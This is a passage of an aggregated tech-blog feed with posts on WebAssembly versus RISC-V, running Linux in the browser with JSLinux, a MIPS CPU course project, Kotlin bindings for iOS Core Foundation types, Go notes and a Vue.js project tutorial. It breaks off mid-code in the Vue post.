misbehave.</li><li>No "gaps" are possible. Therefore the guard page trick to prevent stack overflow in a multi-threaded environment won't work.</li></ul><p>Virtual memory usually comes with memory protection where each memory page has a combination of <em>read</em>, <em>write</em> and <em>execute</em> permissions. This is an important security mechanism because it prevents execution and writes on memory regions where such operations aren't expected. RISC-V implements memory protection but WebAssembly does not - maybe it's less important in an architecture where executable code isn't addressable?</p><p><strong>5. Synchronization</strong></p><p>A computing machine needs at least one conditional branch instruction to be turing complete. Similarly, a multiprocessor architecture needs at least one "atomic conditional branch" instruction for proper synchronization. This instruction is <code>i{32,64}.atomic.rmw.<a href="https://en.wikipedia.org/wiki/Compare-and-swap">cmpxchg</a></code> in WebAssembly, and <code><a href="https://en.wikipedia.org/wiki/Load-link/store-conditional">LR/SC</a></code> in RISC-V.</p><p><code>LR/SC</code> has stronger semantics than <code>cmpxchg</code>. With <code>cmpxchg</code> we have the famous <a href="https://en.wikipedia.org/wiki/ABA_problem">ABA problem</a>, but <code>LR/SC</code> is not affected. It also means that emulating <code>LR/SC</code> with a <code>cmpxchg</code>-only architecture is much more difficult than the other way; something like a global lock or transactional memory has to be used, greatly increasing the complexity. RISC-V is designed for hardware anyway, but if you ever want to write a software implementation you will have to work around this issue.</p><hr><blockquote>Side note: I worked on/am working on both a RISC-V interpreter, <a href="https://github.com/losfair/FlatRv">FlatRv</a>, and a full WebAssembly JIT runtime, <a href="https://github.com/wasmerio/wasmer">Wasmer</a>. Take a look at them and star if you like my work :)</blockquote>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.invariant.cn/try-jslinux/</id>
        <title><![CDATA[用 JSLinux 在浏览器中运行 Linux]]></title>
        <updated>2020-02-24T16:24:41+08:00</updated>
        <link href="https://blog.invariant.cn/try-jslinux/"/>
        <content type="text/html" src="https://blog.invariant.cn/try-jslinux/"><![CDATA[<figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://invariant.me/try-jslinux/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">Running Linux in your Browser with JSLinux</div><div class="kg-bookmark-description">Yesterday I ported the Wasm-based hardware emulator, JSLinux, to use xterm.js for frontend and my wstunnel for networking.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://invariant.me/favicon.ico" alt="用 JSLinux 在浏览器中运行 Linux"><span class="kg-bookmark-author">Heyang Zhou</span><span class="kg-bookmark-publisher">The Invariant</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="用 JSLinux 在浏览器中运行 Linux"></div></a></figure><img src="https://blog.invariant.cn/content/images/2020/03/Alpine_logo.png" alt="用 JSLinux 在浏览器中运行 Linux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> 是 <a href="https://bellard.org/">Fabrice Bellard</a> 写的一个支持 32 位 x86 和 32/64 位 RISC-V 系统模拟的硬件模拟器，可编译为 WebAssembly 以在浏览器中运行。</p><p>昨天我<a href="https://github.com/losfair/jslinux-wstunnel">开了一个分支</a>，把字符终端实现换成了 <a href="https://xtermjs.org/">xterm.js</a> ，把网络实现换成了我的 <a href="https://github.com/losfair/wstunnel">wstunnel</a> 。这里是一个在修改后的 JSLinux 上运行 Alpine Linux 的 x86 虚拟机，可以在线试用。请不要滥用网络 :)</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html-->]]></content>
        <author>
            <name><![CDATA[The Invariant 中文]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/try-jslinux/</id>
        <title><![CDATA[Running Linux in your Browser with JSLinux]]></title>
        <updated>2020-02-24T16:16:18+08:00</updated>
        <link href="https://invariant.me/try-jslinux/"/>
        <content type="text/html" src="https://invariant.me/try-jslinux/"><![CDATA[<img src="https://invariant.me/content/images/2020/02/Alpine_logo.png" alt="Running Linux in your Browser with JSLinux"><p><a href="https://bellard.org/jslinux/">JSLinux</a> is an awesome emulator by <a href="https://bellard.org/">Fabrice Bellard</a> that implements full 32-bit x86 and RV32/RV64 RISC-V systems in the browser using WebAssembly.</p><p>Yesterday I <a href="https://github.com/losfair/jslinux-wstunnel">ported</a> JSLinux to use <a href="https://xtermjs.org/">xterm.js</a> for frontend and my <a href="https://github.com/losfair/wstunnel">wstunnel</a> for networking. Below is a live x86 virtual machine running Alpine Linux. Feel free to try it here (but please do not abuse the network interface) !</p><!--kg-card-begin: html--><iframe style="width: 100%; height: 500px" src="https://jslinux.invariant.me/widget.html">&lt;iframe disabled?&gt;</iframe><!--kg-card-end: html--><p></p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/</id>
        <title><![CDATA[[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0]]></title>
        <updated>2020-02-16T07:31:33+08:00</updated>
        <link href="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"/>
        <content type="text/html" src="https://invariant.me/designing-a-superscalar-ooo-mips-cpu-from-scratch/"><![CDATA[<img src="https://images.unsplash.com/photo-1555589228-135c25ae8cf5?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><p>The CS undergraduate programme at <a href="https://nuaa.edu.cn/">NUAA</a> includes a (compulsory) Computer Organization course for this (4th) semester that requires implementing a MIPS CPU on the <a href="http://www.loongson.cn/index.html">Loongson</a> <a href="http://www.loongson.cn/news/company/628.html">development kit</a>, which is essentially a FPGA board + various useful modules.</p><p>As shown below, the suggested design is a classical 5-stage pipelined architecture:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://invariant.me/content/images/2020/02/--2020-02-16--2.39.51.png" class="kg-image" alt="[PLACEHOLDER] Designing a superscalar MIPS CPU from scratch: #0"><figcaption>Suggested basic 5-stage pipeline</figcaption></figure><p>But it's boring to write "yet another" CPU that implements only the simplest structures. So I decided to extend the design a bit, and build a <a href="https://en.wikipedia.org/wiki/Superscalar_processor">superscalar</a> <a href="https://en.wikipedia.org/wiki/Out-of-order_execution">OoO</a> architecture from the ground up.</p><p>During the next few months I will post my experience as a series of posts both here and on WeChat. <a href="https://invariant.me/subscribe/">Subscribe</a> to stay updated!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/version-2/</id>
        <title><![CDATA[Version 2]]></title>
        <updated>2020-02-14T14:56:07+08:00</updated>
        <link href="https://invariant.me/version-2/"/>
        <content type="text/html" src="https://invariant.me/version-2/"><![CDATA[<img src="https://images.unsplash.com/photo-1530714457710-6bf1899c1d32?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Version 2"><p>I'm migrating and restarting my blog, which is previously at <a href="https://mnotes.me">https://mnotes.me</a> .</p><p>Take a look at the <a href="https://invariant.me/about/">About</a> page or <a href="https://invariant.me/subscribe/">subscribe</a> now!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/moe-native-types.html</id>
        <title><![CDATA[Working with native types: Advanced]]></title>
        <updated>2019-09-22T05:23:17+08:00</updated>
        <link href="https://www.noisyfox.io/moe-native-types.html"/>
        <content type="text/html" src="https://www.noisyfox.io/moe-native-types.html"><![CDATA[<p>After using MOE for several years we discovered some common problems when dealing with native types (Core Foundation Types &amp; Cocoa Types). Here are some of our findings.</p>



<h1>Container Types (NSArray, NSDictionary, CFArrayRef, etc.)</h1>



<ol><li>The content in those containers must be corresponding native types, e.g., values of a <code>NSArray</code> must all be <code>NSObject</code>s, while values of a <code>CFArrayRef</code> must all be <code>OpaquePtr</code>s.<ol><li>NatJ does not automatically convert Java-only types (include primitive types) to compatible native types and vice versa when dealing with containers. When adding values to those containers you need to manually convert it to a corresponding native type. And when reading the value you also need to explicitly convert it to a Java type.</li><li>If you try to store a <strong>Core Foundation</strong> type in a <strong>Cocoa</strong> container, you need to cast it using the <strong>Toll-Free Bridging</strong> which I will talk about later.</li></ol></li><li>Arrays and dictionaries can not have <code>null</code> as either key or value.</li></ol>



<p>If you ever used the iOS <strong>KeyChain</strong> APIs you may did something similar as follows in Objective-C(simplified):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFErrorRef error = NULL;

SecAccessControlRef access =
SecAccessControlCreateWithFlags(kCFAllocatorDefault,
                                kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
                                kSecAccessControlPrivateKeyUsage|kSecAccessControlUserPresence,
                                &amp;error);

NSData* tag = [@"some tag" dataUsingEncoding:NSUTF8StringEncoding];

NSDictionary* attributes =
@{ (id)kSecClass:                   (id)kSecClassKey,
   (id)kSecAttrKeyType:             (id)kSecAttrKeyTypeECSECPrimeRandom,
   (id)kSecAttrKeySizeInBits:       @256,
   (id)kSecAttrTokenID:             (id)kSecAttrTokenIDSecureEnclave,
   (id)kSecPrivateKeyAttrs:
       @{ (id)kSecAttrIsPermanent:    @YES,
          (id)kSecAttrApplicationTag:  tag,
          (id)kSecAttrAccessControl:  (__bridge id)access
        },
   };

SecKeyRef privateKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attributes,
                                             &amp;error);</pre>



<p>The corresponding Kotlin code will be:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)
val tag = NSString.stringWithString("some tag").dataUsingEncoding(NSUTF8StringEncoding)

// Helper function to convert a CF type to Cocoa type
fun OpaquePtr.toNSObject() = ObjCRuntime.cast(this, NSObject::class.java)

val privateKeyAttrs = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
privateKeyAttrs[Security.kSecAttrIsPermanent().toNSObject()] = NSNumber.numberWithBool(true) // Convert Java `boolean` to Cocoa type
privateKeyAttrs[Security.kSecAttrApplicationTag().toNSObject()] = tag
privateKeyAttrs[Security.kSecAttrAccessControl().toNSObject()] = access.toNSObject()

val attributes = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
attributes[Security.kSecClass().toNSObject()] = Security.kSecClassKey().toNSObject()
attributes[Security.kSecAttrKeyType().toNSObject()] = Security.kSecAttrKeyTypeECSECPrimeRandom().toNSObject()
attributes[Security.kSecAttrKeySizeInBits().toNSObject()] = NSNumber.numberWithInt(256) // Convert Java `int` to Cocoa type
attributes[Security.kSecAttrTokenID().toNSObject()] = Security.kSecAttrTokenIDSecureEnclave().toNSObject()
attributes[Security.kSecPrivateKeyAttrs().toNSObject()] = privateKeyAttrs

// Cast NSDictionary to CFDictionaryRef
val cfAttributes = ObjCRuntime.cast(attributes, CFDictionaryRef::class.java)

val privateKey = Security.SecKeyCreateRandomKey(cfAttributes, pError)</pre>



<p>With the help of <a href="https://github.com/Noisyfox/NatJ-Kotlin">this library</a> I created, the code can be simplified as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)

val attributes = mapOf&lt;Any,Any>(
    Security.kSecClass() to Security.kSecClassKey(),
    Security.kSecAttrKeyType() to Security.kSecAttrKeyTypeECSECPrimeRandom(),
    Security.kSecAttrKeySizeInBits() to 256,
    Security.kSecAttrTokenID() to Security.kSecAttrTokenIDSecureEnclave(),
    Security.kSecPrivateKeyAttrs() to mapOf&lt;Any,Any>(
        Security.kSecAttrIsPermanent() to true,
        Security.kSecAttrApplicationTag() to "some tag".toNSData(),
        Security.kSecAttrAccessControl() to access
    )
).toNSDictionary()

val privateKey = Security.SecKeyCreateRandomKey(attributes.bridge(), pError)</pre>



<p>This library also has a help function for creating <code>NSArray</code> from a Java <code>Collection</code>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val nsArray = listOf(1, 2, 3, "some string", someCFRef, someNSType).toNSArray()</pre>



<h1>Toll-Free Bridging &amp; Memory Management</h1>



<p>iOS developers are most likely to be familiar with&nbsp;<strong>Cocoa Touch</strong>&nbsp;frameworks/APIs (does&nbsp;<strong>Foundation</strong>&nbsp;framework sound familiar to you?), which use the programming languages&nbsp;<strong>Objective-C</strong>&nbsp;or&nbsp;<strong>Swift</strong>. </p>



<p>However, you may also heard about another framework called&nbsp;<strong>Core Foundation</strong>.&nbsp;It is a pure&nbsp;<strong>C</strong>&nbsp;framework and provides access to lower level APIs and types.</p>



<p>For iOS development, most frameworks you will use are all designed based on the&nbsp;<strong>Foundation</strong>&nbsp;framework which means the types they use are all&nbsp;<code>NSObject</code>s so&nbsp;<strong>ARC</strong>&nbsp;manages the memory for you and the memory will be automatically released when the object is no longer used.&nbsp;<strong>MOE</strong> does some tricks so&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;also helps when you use those types on&nbsp;<strong>Java</strong>&nbsp;side.</p>



<p>However some low level functions (such as&nbsp;<strong>Security</strong>&nbsp;framework if you try to use&nbsp;<strong>TouchId</strong>) are available in only&nbsp;<strong>C</strong>&nbsp;functions. Hens they use&nbsp;<strong>Core Foundation</strong>&nbsp;types which does not have&nbsp;<strong>ARC</strong>&nbsp;and requires manual memory management. Sadly&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;does no help here (and may even create new issues which I will talk about later).</p>



<h2 id="ownership-cfretain-and-cfrelease">Ownership, CFRetain() and CFRelease()</h2>



<p>Anyone has any&nbsp;<strong>C</strong>&nbsp;experience might still remember those good old days struggling with&nbsp;<code>malloc()</code>&nbsp;and&nbsp;<code>free()</code>&nbsp;while&nbsp;<strong>Core Foundation</strong>&nbsp;brings you&nbsp;<code>CFRetain()</code>&nbsp;and&nbsp;<code>CFRelease()</code>.</p>



<p>Apple has a fantastic document that tells you how&nbsp;<em>Ownership</em>&nbsp;works in manual memory management and when you should use&nbsp;<code>CFRetain()</code>and&nbsp;<code>CFRelease()</code>&nbsp;respectively. I highly recommend you to read it first:</p>



<p>Link:&nbsp;<a href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFMemoryMgmt/Concepts/Ownership.html">Memory Management Programming Guide for Core Foundation &#8211; Ownership Policy</a></p>



<p>Basically if an Core Foundation object is owned by you, you need to call&nbsp;<code>CFRelease()</code>&nbsp;once you are done with it; if it&#8217;s NOT owned by you, in most cases, you need to&nbsp;<code>CFRetain()</code>&nbsp;it, use it, then&nbsp;<code>CFRelease()</code>&nbsp;it afterwards:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Create a CFString, which is owned by you
CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault,
    "https://www.noisyfox.io", kCFStringEncodingUTF8);

/* Do something with urlStr here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Get something from a dict, which is not owned, so a CFRetain() is required
CFStringRef title = (CFStringRef)CFRetain(CFDictionaryGetValue(dict, CFSTR("title")));

/* Do something with title here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<p>You can easily convert above code to&nbsp;<strong>Java</strong>&nbsp;since MOE bindings provide all necessary functions. And with a little help from my library, you could write something like these in&nbsp;<strong>Kotlin</strong>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).use { key ->

    CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().use { title ->
        /* Do something with title here. */
    }
}
// CFRelease is automatically called when block returns
</pre>



<p>The&nbsp;<code>action</code>&nbsp;block of&nbsp;<code>.use()</code>&nbsp;is wrapped in a&nbsp;<code>try</code>&nbsp;block so the resource is guaranteed to be released even if&nbsp;<strong>Exception</strong>&nbsp;is raised in the block.</p>



<h2 id="autoreleasepool-for-core-foundation-types"><code>autoreleasepool</code>&nbsp;for&nbsp;<strong>Core Foundation</strong>&nbsp;types</h2>



<p><code>.use()</code>&nbsp;mentioned above will create a lot of nested scopes if you have a lot of those&nbsp;<strong>Core Foundation</strong>&nbsp;objects. That makes the code unreadable. With the help of&nbsp;<code>autoreleasepool</code>&nbsp;you could rewrite the above code to something like this:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">autoreleasepool {
    val key = CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).autorelease()
    val title = CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().autorelease()

    /* Do something with title here. */
}
// CFRelease is automatically called for each object that called .autorelease() when autoreleasepool block ends
</pre>



<p><strong>NB</strong>: Make sure the&nbsp;<code>autoreleasepool</code>&nbsp;you called is imported from package&nbsp;<code>io.noisyfox.moe.natj</code>&nbsp;since&nbsp;<strong>NatJ</strong>&nbsp;has it&#8217;s own impl&nbsp;<code>org.moe.natj.objc.ObjCRuntime#autoreleasepool(java.lang.Runnable)</code>&nbsp;which is not a&nbsp;<strong>Kotlin</strong>&nbsp;<code>inline</code>&nbsp;function which doesn&#8217;t support certain features (such as&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#non-local-returns">non-local returns</a>&nbsp;and&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#reified-type-parameters">reified type parameters</a>).</p>



<h2 id="type-bridging">Type Bridging</h2>



<p>WIP</p>



<h1>Misc</h1>



<p>The library also contains some other help functions for converting between Java types and native types such as <code>ByteArray</code> &lt;=&gt; <code>NSData</code>. I won&#8217;t list all functions here since you could easily find them in source code.</p>



<h1>The library &#8211; <strong><a href="https://github.com/Noisyfox/NatJ-Kotlin">NatJ-Kotlin</a></strong></h1>



<p>This is a library I created that contains some helper functions I used in my work. It&#8217;s currently available in only source code form. I will create a jar release and publish it to jcenter ASAP.</p>



<p>The library is written in Kotlin but most of the functions can also be used in Java.</p>



<h1>Discussion</h1>



<p>Any idea of  library improving are welcomed. If you found any mistake in my post, or have any other problem that is not covered, please not hesitate to share with us by leaving comments.</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/moe-native-types.html">Working with native types: Advanced</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/go-internal-note/</id>
        <title><![CDATA[《深入解析Go》笔记]]></title>
        <updated>2019-06-24T08:40:49+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/go-internal-note/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/go-internal-note/"><![CDATA[<p>在 GitHub 上找到一本解读 Go 实现细节的好书，名叫<a href="https://github.com/tiancaiamao/go-internals/" target="_blank" rel="noopener">《深入解析 Go》</a>。<br>大致看了一遍，简单做了些笔记。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/06/golang-learning-experience/</id>
        <title><![CDATA[Golang 学习记录]]></title>
        <updated>2019-06-24T08:25:39+08:00</updated>
        <link href="https://blog.stdioa.com/2019/06/golang-learning-experience/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/06/golang-learning-experience/"><![CDATA[<p>这几个月在考虑从 Python 转向 Golang，所以专门学习了 Golang.<br>这里是 Golang 学习的一些记录。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2019/05/find-minn-with-heap/</id>
        <title><![CDATA[用堆找出最小的 N 个数]]></title>
        <updated>2019-05-21T08:46:12+08:00</updated>
        <link href="https://blog.stdioa.com/2019/05/find-minn-with-heap/"/>
        <content type="text/html" src="https://blog.stdioa.com/2019/05/find-minn-with-heap/"><![CDATA[<p>不知道为啥，突然想水一篇很水的算法文章。</p>]]></content>
        <author>
            <name><![CDATA[Stdio’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/vue-demo-instruction/</id>
        <title><![CDATA[Vue.js 从入坑到入土]]></title>
        <updated>2019-04-23T13:25:25+08:00</updated>
        <link href="https://blog.creedowl.com/posts/vue-demo-instruction/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/vue-demo-instruction/"><![CDATA[<h1 id="vuejs-从入坑到入土">Vue.js 从入坑到入土</h1>
<p>近年来前端领域发展飞速，从最早的直接写html, js, css 到使用jQuery快速开发，再到近年来使用Vuejs，Reactjs 实现工程化开发，也就短短十几年。虽然前端项目结构越来越复杂，但也越来越规范，清晰，更加工程化。当前较为流行的前端框架有Vuejs、Reactjs、Angularjs 等，而Vuejs由于其灵(zhong)活(wen)轻(wen)便(dang)，较为流行。虽然Vuejs有完善的中文文档，但文档主要在介绍其用法，缺少如何实现一个完整项目的指导，本文就介绍如何用Vuejs创建一个完整的前端项目，并与后端进行交互。</p>
<p><strong>本文基于<a href="mailto:Vuejs@2.x">Vuejs@2.x</a>及<a href="mailto:VueCLI@3.x">VueCLI@3.x</a></strong></p>
<ol>
<li>所需技术栈：html, javascript, css基础知识，其中js建议了解<strong>ES2015</strong>标准，特别要掌握<strong>promise</strong>的使用</li>
<li>使用的工具：<del>宇宙第一编辑器</del> VSCode —— 现在对vue项目的支持已经很好了，可以自动安装vue项目需要的插件</li>
</ol>
<h1 id="0x0-安装">0x0 安装</h1>
<blockquote>
<p>推荐使用<a href="https://yarnpkg.com/lang/zh-hans">yarn</a>代替npm作为包管理器</p>
</blockquote>
<h2 id="安装vuecli">安装VueCLI</h2>
<blockquote>
<p>VueCLI是Vuejs官方推出的项目脚手架工具，可以方便的创建、管理Vue项目，还提供优雅的web管理界面</p>
</blockquote>
<p>全局安装<a href="https://cli.vuejs.org/zh/">VueCLI</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">yarn global add @vue/cli
</code></pre></div><h2 id="安装vue-devtools">安装Vue-devtools</h2>
<blockquote>
<p><a href="https://github.com/vuejs/vue-devtools">Vue-devtools</a> 是vue官方的浏览器开发插件，可以方便的在浏览器中调试vue应用</p>
</blockquote>
<p>Vue-devtools 提供多平台的浏览器插件可以直接安装使用</p>
<p><a href="https://github.com/vuejs/vue-devtools#installation">installation</a></p>
<h1 id="0x1-新建项目">0x1 新建项目</h1>
<p>使用 <code>vue create vue_demo</code> 创建新项目，接下来会出现一个交互式命令行帮你配置项目。</p>
<p><strong>注意此处不要使用默认的配置！具体配置参考下图</strong></p>
<blockquote>
<p>坑x1 默认的配置十分简单，新手经常不知道怎么写多页面，弄不明白项目怎么组织的，所以需要自定义配置，添加vue-router插件实现多页面跳转</p>
</blockquote>
<p><a href="https://asciinema.org/a/240155"><img src="https://asciinema.org/a/240155.svg" alt="asciicast"></a></p>
<h1 id="0x2-项目框架">0x2 项目框架</h1>
<p>此时项目已经创建成功，如果你按照提示启动项目就能看到经典的vue启动页</p>
<p><img src="http://ww1.sinaimg.cn/large/0071ouepgy1g1yg2r5ysxj30up0mx3zv.jpg" alt="image"></p>
<p>当前的项目结构如下</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">.                     项目根目录
├── README.md 
├── babel.config.js
├── package.json      项目主配置文件
├── public            公共资源文件夹
│   ├── favicon.ico
│   └── index.html    入口html
├── src               源码根目录
│   ├── App.vue       入口文件
│   ├── assets        资源文件夹
│   │   └── logo.png
│   ├── components    组件文件夹
│   │   └── HelloWorld.vue 
│   ├── main.js       入口配置文件
│   ├── router.js     路由文件
│   ├── store.js      状态管理
│   └── views         页面文件夹
│       ├── About.vue
│       └── Home.vue
└── yarn.lock         依赖文件
</code></pre></div><p>在下面的章节具体介绍各个文件、文件夹的用处和如何组织项目。</p>
<h1 id="0x3-项目结构">0x3 项目结构</h1>
<p>用vue开发的项目一般是<a href="https://zh.wikipedia.org/wiki/%E5%8D%95%E9%A1%B5%E5%BA%94%E7%94%A8">SPA(单页应用)</a>，通过动态重写当前页面来与用户交互，而不会重新加载整个新页面。所以要组织多页面就要通过vue-router来组织页面，而vuex用来保存状态。</p>
<p>作为单页应用，当然需要一个入口html文件，也就是 <code>public/index.html</code> :</p>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">public/index.html

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width,initial-scale=1.0&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;icon&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;&lt;%= BASE_URL %&gt;favicon.ico&#34;</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>vue_demo<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">noscript</span><span class="p">&gt;</span>
      <span class="p">&lt;</span><span class="nt">strong</span><span class="p">&gt;</span>We&#39;re sorry but vue_demo doesn&#39;t work properly without JavaScript enabled. Please enable it to continue.<span class="p">&lt;/</span><span class="nt">strong</span><span class="p">&gt;</span>
    <span class="p">&lt;/</span><span class="nt">noscript</span><span class="p">&gt;</span>
    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
    <span class="c">&lt;!-- built files will be auto injected --&gt;</span>
  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div><p>这是默认生成的 <code>index.html</code> ，而编译好的文件（网页内容）会被自动注入到 `` 中，也就意味着要使用vue开发的应用，浏览器必须支持js。</p>
<p>而#app所绑定的vue实例，则位于 <code>src/main.js</code></p>
<hr>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="nx">src</span><span class="o">/</span><span class="nx">main</span><span class="p">.</span><span class="nx">js</span>

<span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
<span class="kr">import</span> <span class="nx">App</span> <span class="nx">from</span> <span class="s1">&#39;./App.vue&#39;</span>
<span class="kr">import</span> <span class="nx">router</span> <span class="nx">from</span> <span class="s1">&#39;./router&#39;</span>
<span class="kr">import</span> <span class="nx">store</span> <span class="nx">from</span> <span class="s1">&#39;./store&#39;</span>
<span class="nx">Vue</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">productionTip</span> <span class="o">=</span> <span class="kc">false</span>
<span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
  <span class="nx">router</span><span class="p">,</span> <span class="c1">// 使用vue-router插件
